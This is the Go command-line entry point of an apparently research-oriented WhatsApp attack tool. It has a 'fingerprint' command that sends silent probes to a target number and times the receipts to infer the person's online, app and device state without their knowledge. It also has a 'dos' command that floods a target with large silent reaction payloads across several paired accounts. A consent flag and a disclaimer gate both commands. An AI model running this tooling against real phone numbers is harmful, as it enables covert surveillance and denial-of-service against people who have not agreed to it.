package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/mdp/qrterminal/v3"
	waLog "go.mau.fi/whatsmeow/util/log"

	"github.com/ctrlsam/careless-whisper-go/internal/exporter"
	"github.com/ctrlsam/careless-whisper-go/internal/flood"
	"github.com/ctrlsam/careless-whisper-go/internal/messenger"
	"github.com/ctrlsam/careless-whisper-go/internal/messenger/whatsapp"
	"github.com/ctrlsam/careless-whisper-go/internal/metrics"
	"github.com/ctrlsam/careless-whisper-go/internal/model"
	"github.com/ctrlsam/careless-whisper-go/internal/runner"
)

const disclaimerText = "RESEARCH USE ONLY. This tool sends real messages to a real phone number. " +
	"Only run it against devices and phone numbers you own or are explicitly authorised to test. " +
	"Unauthorised use may be illegal. Confirm ownership with --i-own-the-target."

func printDisclaimer() {
	fmt.Fprintln(os.Stderr, "============================================================")
	fmt.Fprintln(os.Stderr, disclaimerText)
	fmt.Fprintln(os.Stderr, "============================================================")
}

// requireConsent enforces the ownership acknowledgement gate.
func requireConsent(consent bool) error {
	printDisclaimer()
	if !consent {
		return errors.New("refusing to run a live tool without --i-own-the-target; " +
			"only use this against devices and phone numbers you own or are authorised to test")
	}
	return nil
}

// buildMessenger builds a single-account messenger for a run command. It
// requires a session already linked with `pair` and never drives pairing, so a
// missing or unlinked session fails fast instead of dropping into QR login.
func buildMessenger(provider, sessionPath string, connectTimeout time.Duration) (messenger.Messenger, error) {
	if provider != "whatsapp" {
		return nil, fmt.Errorf("unsupported provider %q (only whatsapp is implemented)", provider)
	}
	return whatsapp.New(
		whatsapp.WithSessionPath(sessionPath),
		whatsapp.WithConnectTimeout(connectTimeout),
		whatsapp.WithRequirePaired(),
		whatsapp.WithStatusHandler(func(message string) { log.Printf("whatsapp: %s", message) }),
		whatsapp.WithLogger(waLog.Stdout("WhatsApp", "ERROR", true)),
	), nil
}

// buildFloodMessenger builds the flood messenger from explicit, number-named
// per-account session files. A single path yields one messenger; several yield
// a Pool that fans sends across those accounts, each with its own identity,
// session, socket, and send lock. Like buildMessenger it requires pre-linked
// sessions and never pairs.
func buildFloodMessenger(provider string, paths []string, connectTimeout time.Duration) (messenger.Messenger, error) {
	if provider != "whatsapp" {
		return nil, fmt.Errorf("unsupported provider %q (only whatsapp is implemented)", provider)
	}
	if len(paths) == 1 {
		return buildMessenger(provider, paths[0], connectTimeout)
	}
	status := func(account int, message string) {
		log.Printf("account %d: %s", account+1, message)
	}
	return whatsapp.NewPool(whatsapp.PoolConfig{
		Paths:         paths,
		Status:        status,
		PairTimeout:   connectTimeout,
		RequirePaired: true,
		Logger:        waLog.Stdout("WhatsApp", "ERROR", true),
	}), nil
}

// parseProbeKind validates the --probe-kind value against the supported silent
// probe primitives.
func parseProbeKind(value string) (messenger.ProbeKind, error) {
	switch kind := messenger.ProbeKind(strings.TrimSpace(value)); kind {
	case messenger.ProbeRevoke, messenger.ProbeEmptyReaction, messenger.ProbeReaction:
		return kind, nil
	default:
		return "", fmt.Errorf("invalid --probe-kind %q (want revoke, empty-reaction, or reaction)", value)
	}
}

// resolveSessionPath picks the session store for a single-account command.
// Precedence: an explicit --session-path, then --account resolved inside
// sessionDir, then the sole paired session already in sessionDir.
func resolveSessionPath(sessionPath, sessionDir, account string) (string, error) {
	if strings.TrimSpace(sessionPath) != "" {
		return sessionPath, nil
	}
	if strings.TrimSpace(account) != "" {
		return accountSessionPath(sessionDir, account)
	}
	sessions, err := whatsapp.ListSessions(sessionDir)
	if err != nil {
		return "", err
	}
	switch len(sessions) {
	case 0:
		return "", fmt.Errorf("no paired sessions in %s; run `pair --account <number>` first, or pass --session-path", sessionDir)
	case 1:
		return sessions[0], nil
	default:
		return "", fmt.Errorf("multiple sessions in %s; pick one with --account <number> (have: %s)", sessionDir, strings.Join(sessionNumbers(sessions), ", "))
	}
}

// accountSessionPath resolves <sessionDir>/<number>.db and ensures sessionDir
// exists (it holds linked-device keys, so it is created private to the user).
func accountSessionPath(sessionDir, account string) (string, error) {
	path, err := whatsapp.SessionPathForNumber(sessionDir, account)
	if err != nil {
		return "", err
	}
	if err := os.MkdirAll(sessionDir, 0o700); err != nil {
		return "", fmt.Errorf("create session dir: %w", err)
	}
	return path, nil
}

// resolvePairPath resolves where `pair` stores a session and the account number
// the file should link to. An explicit --session-path is used verbatim;
// otherwise the file is <session-dir>/<number>.db, with number from --account
// (or --pair-phone when pairing by code).
func resolvePairPath(sessionPath, sessionDir, account, pairPhone string) (path, number string, err error) {
	if strings.TrimSpace(sessionPath) != "" {
		return sessionPath, strings.TrimSpace(account), nil
	}
	number = strings.TrimSpace(account)
	if number == "" {
		number = strings.TrimSpace(pairPhone)
	}
	if number == "" {
		return "", "", errors.New("pass --account <number> (the research account being paired), or --session-path for an explicit file")
	}
	path, err = accountSessionPath(sessionDir, number)
	if err != nil {
		return "", "", err
	}
	return path, number, nil
}

// resolveAccountPaths resolves the per-account session files for a flood run. A
// non-empty accounts list is resolved by number; otherwise, with no explicit
// --session-path, a single paired session in sessionDir is used; several
// without a selector is an error so a flood never fans across more accounts
// than intended.
func resolveAccountPaths(sessionPath, sessionDir, accounts string) ([]string, error) {
	if strings.TrimSpace(accounts) != "" {
		var paths []string
		for _, num := range strings.Split(accounts, ",") {
			if strings.TrimSpace(num) == "" {
				continue
			}
			path, err := accountSessionPath(sessionDir, num)
			if err != nil {
				return nil, err
			}
			paths = append(paths, path)
		}
		if len(paths) == 0 {
			return nil, errors.New("--account listed no numbers")
		}
		return paths, nil
	}
	if strings.TrimSpace(sessionPath) != "" {
		return []string{sessionPath}, nil
	}
	sessions, err := whatsapp.ListSessions(sessionDir)
	if err != nil {
		return nil, err
	}
	switch len(sessions) {
	case 0:
		return nil, fmt.Errorf("no paired sessions in %s; run `pair --account <number>` first, or pass --session-path", sessionDir)
	case 1:
		return sessions, nil
	default:
		return nil, fmt.Errorf("found %d paired sessions in %s; choose which to flood with --account '<n0>,<n1>' (have: %s), or pass a single --session-path", len(sessions), sessionDir, strings.Join(sessionNumbers(sessions), ", "))
	}
}

// sessionNumbers maps session file paths to their account-number base names.
func sessionNumbers(paths []string) []string {
	numbers := make([]string, len(paths))
	for i, p := range paths {
		numbers[i] = strings.TrimSuffix(filepath.Base(p), ".db")
	}
	return numbers
}

// signalContext cancels when the process receives SIGINT or SIGTERM.
func signalContext() (context.Context, context.CancelFunc) {
	return signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
}

type consoleLogger struct{}

func (consoleLogger) OnReport(report model.ReceiptReport) {
	log.Printf("report: %.2fms RTT for %s (msg %s)", report.DelayMillis(), report.PhoneNumber, report.MessageID)
}

func (consoleLogger) OnAnalysis(analysis model.Analysis) {
	net := "n/a"
	if analysis.AccessNetwork != nil {
		net = analysis.AccessNetwork.Type
		if analysis.AccessNetwork.TransitionDetected {
			net += "*" // baseline step-change flagged; see access_network in the export
		}
	}
	log.Printf("analysis: phone=%s app=%s online=%s device=%s net=%s avg_rtt=%.1fms jitter=%.1fms samples=%d",
		analysis.PhoneState, analysis.AppState, analysis.OnlineStatus,
		analysis.DeviceType, net, analysis.AverageRTTMillis, analysis.StdDevRTTMillis, analysis.TotalRequests)
}

func (consoleLogger) Info(message string) { log.Printf("info: %s", message) }
func (consoleLogger) Warn(message string) { log.Printf("warning: %s", message) }

func fingerprintCommand(args []string, stdout io.Writer) error {
	flags := flag.NewFlagSet("fingerprint", flag.ContinueOnError)
	phoneNumber := flags.String("phone-number", "", "target phone number for fingerprinting")
	provider := flags.String("provider", "whatsapp", "messenger provider to use")
	delay := flags.Duration("delay", time.Second, "delay between requests per worker")
	concurrent := flags.Int("concurrent", 5, "number of concurrent requests")
	exporterName := flags.String("exporter", "", "exporter for results and analysis: jsonl or csv")
	exportDir := flags.String("export-dir", "exports", "directory for exported files")
	enableMetrics := flags.Bool("metrics", false, "enable the Prometheus metrics server")
	metricsPort := flags.Int("metrics-port", 8000, "port for the Prometheus metrics server")
	sessionPath := flags.String("session-path", "", "explicit session store path (overrides --account/--session-dir)")
	sessionDir := flags.String("session-dir", whatsapp.DefaultSessionDir(), "directory holding number-named session stores")
	account := flags.String("account", "", "research account number whose paired session to use (resolves to <session-dir>/<number>.db; omit to use the only paired session)")
	connectTimeout := flags.Duration("connect-timeout", 30*time.Second, "how long to wait for the paired session to connect before giving up")
	ignoreUnregistered := flags.Bool("ignore-unregistered", false, "ignore unregistered-number warning")
	probeKind := flags.String("probe-kind", "revoke", "silent probe primitive: revoke, empty-reaction, or reaction (reaction is visible on the target)")
	consent := flags.Bool("i-own-the-target", false, "confirm you own or are authorised to test the target")
	if handled, err := handleHelp(flags, args, stdout, "Live receipt-timing fingerprint against an authorised target"); err != nil || handled {
		return err
	}
	if err := requireConsent(*consent); err != nil {
		return err
	}
	if *phoneNumber == "" {
		return errors.New("--phone-number is required")
	}
	kind, err := parseProbeKind(*probeKind)
	if err != nil {
		return err
	}
	resolvedPath, err := resolveSessionPath(*sessionPath, *sessionDir, *account)
	if err != nil {
		return err
	}

	m, err := buildMessenger(*provider, resolvedPath, *connectTimeout)
	if err != nil {
		return err
	}

	var exp exporter.Exporter
	if *exporterName != "" {
		exp, err = exporter.NewFileExporter(*exporterName, *exportDir, *phoneNumber)
		if err != nil {
			return err
		}
	}

	observer := newMetricsObserver(*phoneNumber, *enableMetrics)
	if observer.server != nil {
		if err := observer.server.Start(*metricsPort); err != nil {
			return fmt.Errorf("start metrics server: %w", err)
		}
		log.Printf("metrics server listening on :%d/metrics", *metricsPort)
		defer func() { _ = observer.server.Stop(context.Background()) }()
	}

	ctx, cancel := signalContext()
	defer cancel()

	if err := m.Start(ctx); err != nil {
		return fmt.Errorf("start messenger: %w", err)
	}
	defer func() { _ = m.Stop(context.Background()) }()

	log.Printf("waiting for %s to be ready...", *provider)
	if err := m.WaitUntilReady(ctx); err != nil {
		return err
	}
	log.Printf("connected. fingerprinting %s (Ctrl+C to stop)", *phoneNumber)

	err = runner.Run(ctx, m, runner.Settings{
		PhoneNumber:        *phoneNumber,
		ConcurrentWorkers:  *concurrent,
		DelayBetween:       *delay,
		IgnoreUnregistered: *ignoreUnregistered,
		ProbeKind:          kind,
	}, exp, observer)
	if errors.Is(err, context.Canceled) {
		return nil
	}
	return err
}

// pairCommand links (or validates) a reusable WhatsApp session at
// --session-path and exits cleanly, so a session can be set up once and reused
// across fingerprint/dos runs without re-scanning. It connects, waits for an
// authenticated connection, then stops cleanly so the store is checkpointed.
func pairCommand(args []string, stdout io.Writer) error {
	flags := flag.NewFlagSet("pair", flag.ContinueOnError)
	provider := flags.String("provider", "whatsapp", "messenger provider to use")
	sessionPath := flags.String("session-path", "", "explicit session store path (overrides --account/--session-dir)")
	sessionDir := flags.String("session-dir", whatsapp.DefaultSessionDir(), "directory to store the number-named session file in")
	account := flags.String("account", "", "the research account's own number being paired; names the file <session-dir>/<number>.db")
	pairPhone := flags.String("pair-phone", "", "link by phone-number code instead of QR; value is the research account's own number")
	pairTimeout := flags.Duration("pair-timeout", 5*time.Minute, "how long to wait for pairing or validation before giving up")
	repair := flags.Bool("repair", false, "discard any existing session at the resolved path and pair fresh")
	if handled, err := handleHelp(flags, args, stdout, "Link or validate a reusable session and exit"); err != nil || handled {
		return err
	}
	if *provider != "whatsapp" {
		return fmt.Errorf("unsupported provider %q (only whatsapp is implemented)", *provider)
	}
	resolvedPath, number, err := resolvePairPath(*sessionPath, *sessionDir, *account, *pairPhone)
	if err != nil {
		return err
	}
	if *repair {
		if err := removeSessionFiles(resolvedPath); err != nil {
			return err
		}
		log.Printf("cleared existing session at %s", resolvedPath)
	}

	opts := []whatsapp.Option{
		whatsapp.WithSessionPath(resolvedPath),
		whatsapp.WithConnectTimeout(*pairTimeout),
		whatsapp.WithLogger(waLog.Stdout("WhatsApp", "ERROR", true)),
		whatsapp.WithStatusHandler(func(message string) { log.Printf("pair: %s", message) }),
	}
	if *pairPhone != "" {
		opts = append(opts,
			whatsapp.WithPhonePairing(*pairPhone),
			whatsapp.WithPairCodeHandler(func(code string) {
				fmt.Fprintf(os.Stderr, "On the research number, open Linked devices -> Link a device -> Link with phone number instead, and enter: %s\n", code)
			}),
		)
	} else {
		opts = append(opts, whatsapp.WithQRHandler(func(code string) {
			fmt.Fprintln(os.Stderr, "Scan this QR code with the research account (WhatsApp -> Linked devices):")
			qrterminal.GenerateHalfBlock(code, qrterminal.L, os.Stderr)
		}))
	}
	m := whatsapp.New(opts...)

	ctx, cancel := signalContext()
	defer cancel()

	if err := m.Start(ctx); err != nil {
		return fmt.Errorf("start messenger: %w", err)
	}
	defer func() { _ = m.Stop(context.Background()) }()

	log.Printf("validating session at %s (Ctrl+C to abort)...", resolvedPath)
	switch err := m.WaitUntilReady(ctx); {
	case errors.Is(err, context.Canceled):
		return nil
	case errors.Is(err, whatsapp.ErrLoggedOut):
		return errors.New("the saved session was unlinked by the server; re-run with --repair to pair fresh")
	case err != nil:
		if jid, paired := m.DeviceJID(); paired {
			return fmt.Errorf("the saved session (device %s) did not reconnect within %s; it may have been unlinked - re-run with --repair to pair fresh", jid, *pairTimeout)
		}
		return fmt.Errorf("pairing did not complete within %s: %w", *pairTimeout, err)
	}

	jid, _ := m.DeviceJID()
	bound, _ := m.DeviceUser()
	if number != "" {
		if normalised, nerr := whatsapp.NormalizeNumber(number); nerr == nil && bound != "" && bound != normalised {
			log.Printf("warning: linked to %s but the file is named for %s; name is misleading - re-run with --repair using the correct --account", bound, normalised)
		}
	}
	if m.PairedThisSession() {
		log.Printf("paired and saved as %s at %s", jid, resolvedPath)
	} else {
		log.Printf("existing session validated as %s at %s", jid, resolvedPath)
	}
	log.Printf("session ready; reuse it with --account %s (or --session-path %s)", bound, resolvedPath)
	return nil
}

// removeSessionFiles deletes a SQLite session store and its WAL sidecars.
func removeSessionFiles(path string) error {
	for _, suffix := range []string{"", "-wal", "-shm"} {
		if err := os.Remove(path + suffix); err != nil && !errors.Is(err, os.ErrNotExist) {
			return fmt.Errorf("remove %s: %w", path+suffix, err)
		}
	}
	return nil
}

// metricsObserver forwards analysis to both the console and the metrics server.
type metricsObserver struct {
	consoleLogger
	server *metrics.Server
}

func newMetricsObserver(phoneNumber string, enabled bool) *metricsObserver {
	observer := &metricsObserver{}
	if enabled {
		observer.server = metrics.NewServer(phoneNumber)
	}
	return observer
}

func (o *metricsObserver) OnAnalysis(analysis model.Analysis) {
	o.consoleLogger.OnAnalysis(analysis)
	if o.server != nil {
		o.server.Update(analysis)
	}
}

type floodReporter struct{}

func (floodReporter) Progress(stats flood.Stats, payloadSize int) {
	gib := stats.EstimatedGiB(payloadSize)
	if stats.Acked {
		log.Printf("flood: %d sent (server-acked), %d failed, %.1f msg/s, ~%.3f GiB accepted (upper bound; not all reaches the target)",
			stats.Sent, stats.Failed, stats.Rate(), gib)
		return
	}
	log.Printf("flood: %d sent (no-ack, delivery unconfirmed), %d failed, %.1f msg/s, ~%.3f GiB written - UNCONFIRMED upper bound; drop --no-ack to count only accepted sends",
		stats.Sent, stats.Failed, stats.Rate(), gib)
}

func (floodReporter) Warn(message string) { log.Printf("warning: %s", message) }
func (floodReporter) Info(message string) { log.Printf("info: %s", message) }

func dosCommand(args []string, stdout io.Writer) error {
	flags := flag.NewFlagSet("dos", flag.ContinueOnError)
	phoneNumber := flags.String("phone-number", "", "target phone number to flood")
	provider := flags.String("provider", "whatsapp", "messenger provider to use")
	concurrent := flags.Int("concurrent", 10, "number of concurrent flood workers")
	delay := flags.Duration("delay", 0, "delay between messages per worker")
	duration := flags.Duration("duration", 0, "stop after this long (default: run until interrupted)")
	maxMessages := flags.Int("max-messages", 0, "stop after sending this many messages (default: unlimited)")
	payloadSize := flags.Int("payload-size", flood.DefaultPayloadSize, "size in bytes of each reaction payload")
	reportInterval := flags.Duration("report-interval", 5*time.Second, "how often to log flood progress")
	noAck := flags.Bool("no-ack", false, "do not wait for the per-message server ack (higher throughput, no send confirmation)")
	account := flags.String("account", "", "comma-separated research account numbers to fan sends across; each resolves to <session-dir>/<number>.db")
	sessionPath := flags.String("session-path", "", "explicit session store path for a single account (overrides --account/--session-dir)")
	sessionDir := flags.String("session-dir", whatsapp.DefaultSessionDir(), "directory holding number-named session stores")
	connectTimeout := flags.Duration("connect-timeout", 30*time.Second, "how long to wait for each paired session to connect before giving up")
	ignoreUnregistered := flags.Bool("ignore-unregistered", false, "ignore unregistered-number warning")
	consent := flags.Bool("i-own-the-target", false, "confirm you own or are authorised to test the target")
	if handled, err := handleHelp(flags, args, stdout, "Silent-reaction denial-of-service flood against an authorised target"); err != nil || handled {
		return err
	}
	if err := requireConsent(*consent); err != nil {
		return err
	}
	if *phoneNumber == "" {
		return errors.New("--phone-number is required")
	}

	paths, err := resolveAccountPaths(*sessionPath, *sessionDir, *account)
	if err != nil {
		return err
	}
	m, err := buildFloodMessenger(*provider, paths, *connectTimeout)
	if err != nil {
		return err
	}
	accountCount := len(paths)

	ctx, cancel := signalContext()
	defer cancel()

	if accountCount > 1 {
		log.Printf("using %d paired accounts", accountCount)
	}
	if err := m.Start(ctx); err != nil {
		return fmt.Errorf("start messenger: %w", err)
	}
	defer func() { _ = m.Stop(context.Background()) }()

	log.Printf("waiting for %s to be ready...", *provider)
	if err := m.WaitUntilReady(ctx); err != nil {
		return err
	}
	log.Printf("connected. flooding %s with %d workers across %d account(s) (%.2f MiB payload). Ctrl+C to stop",
		*phoneNumber, *concurrent, accountCount, float64(*payloadSize)/(1024*1024))

	stats, err := flood.Run(ctx, m, flood.Settings{
		PhoneNumber:        *phoneNumber,
		ConcurrentWorkers:  *concurrent,
		DelayBetween:       *delay,
		Duration:           *duration,
		MaxMessages:        *maxMessages,
		PayloadSize:        *payloadSize,
		ReportInterval:     *reportInterval,
		IgnoreUnregistered: *ignoreUnregistered,
		NoAck:              *noAck,
	}, floodReporter{})
	if err != nil && !errors.Is(err, context.Canceled) {
		return err
	}
	basis := "accepted by server, upper bound"
	if !stats.Acked {
		basis = "sent via --no-ack, delivery unconfirmed and likely overstated"
	}
	log.Printf("flood finished: %d sent, %d failed over %s (%.1f msg/s, ~%.3f GiB %s)",
		stats.Sent, stats.Failed, stats.Elapsed.Round(time.Millisecond), stats.Rate(),
		stats.EstimatedGiB(*payloadSize), basis)
	return nil
}
